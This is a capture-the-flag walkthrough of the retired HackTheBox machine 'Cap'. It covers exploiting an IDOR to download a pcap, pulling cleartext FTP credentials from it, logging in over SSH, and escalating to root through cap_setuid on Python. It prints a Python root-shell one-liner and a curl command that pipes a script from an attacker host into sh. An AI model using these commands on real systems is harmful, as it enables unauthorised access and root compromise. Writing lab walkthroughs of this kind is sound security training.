# HackTheBox — Cap Write-up

| | |
|---|---|
| **Platform** | HackTheBox |
| **Machine** | Cap |
| **OS** | Linux |
| **Focus** | IDOR on a pcap dashboard, credential recovery from network capture, Linux capabilities (`cap_setuid`) privilege escalation |

> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP where shown.

---

## 1. Reconnaissance

Connect to the HTB VPN and reach the target's web app — a **Security Dashboard**. The dashboard lets you generate and **download a PCAP** of captured traffic.

After running a capture, you're redirected to a URL like:

```
http://<target-ip>/data/<id>
```

where `<id>` is a number that changes on each visit, and the corresponding download is `/download/<id>` (e.g. `<id>.pcap`).

---

## 2. IDOR — Grabbing the First Capture

The capture ID is **predictable and not access-controlled** — a classic Insecure Direct Object Reference (IDOR). Instead of using the freshly generated (and usually empty) capture, manually request a lower index:

```
http://<target-ip>/data/0
```

Download `0.pcap` — the very first capture, which contains earlier session traffic.

---

## 3. Credential Recovery from the PCAP

Open `0.pcap` in **Wireshark** (or run `strings` / follow TCP streams). The capture includes a cleartext authentication exchange — an **FTP login** sends the **username and password in plaintext**.

Recover the credentials for the user **`nathan`** from that stream.

---

## 4. Foothold

The recovered FTP credentials are reused for SSH. Log in:

```bash
ssh nathan@<target-ip>
```

The **user flag** is readable in `nathan`'s home directory:

```bash
ls
cat user.txt
```

---

## 5. Privilege Escalation — Linux Capabilities

Enumerate file capabilities across the whole filesystem:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/.../gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

> `getcap -r / 2>/dev/null` is a "treasure hunt" for binaries granted special Linux capabilities. Capabilities are fine-grained slices of root power assigned to a binary, independent of SUID bits.

The critical line:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**`cap_setuid`** on the Python binary means Python can change its own UID to anything — including `0` (root) — without being SUID-root. That's a direct path to a root shell.

### Get root

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This sets the UID to `0` and spawns a shell as root. The **root flag** is then readable from `/root/`.

---

## Appendix — Enumeration with LinPEAS

If the capability misconfiguration isn't obvious manually, **LinPEAS** automates the search for privilege-escalation paths.

Serve the script from your attacker box:

```bash
sudo python3 -m http.server 80
```

Then pull and run it on the target:

```bash
# on the target
curl http://<attacker-ip>/linpeas.sh | sh
# or: wget http://<attacker-ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

LinPEAS would flag the `cap_setuid` capability on `python3.8` among its findings.

---

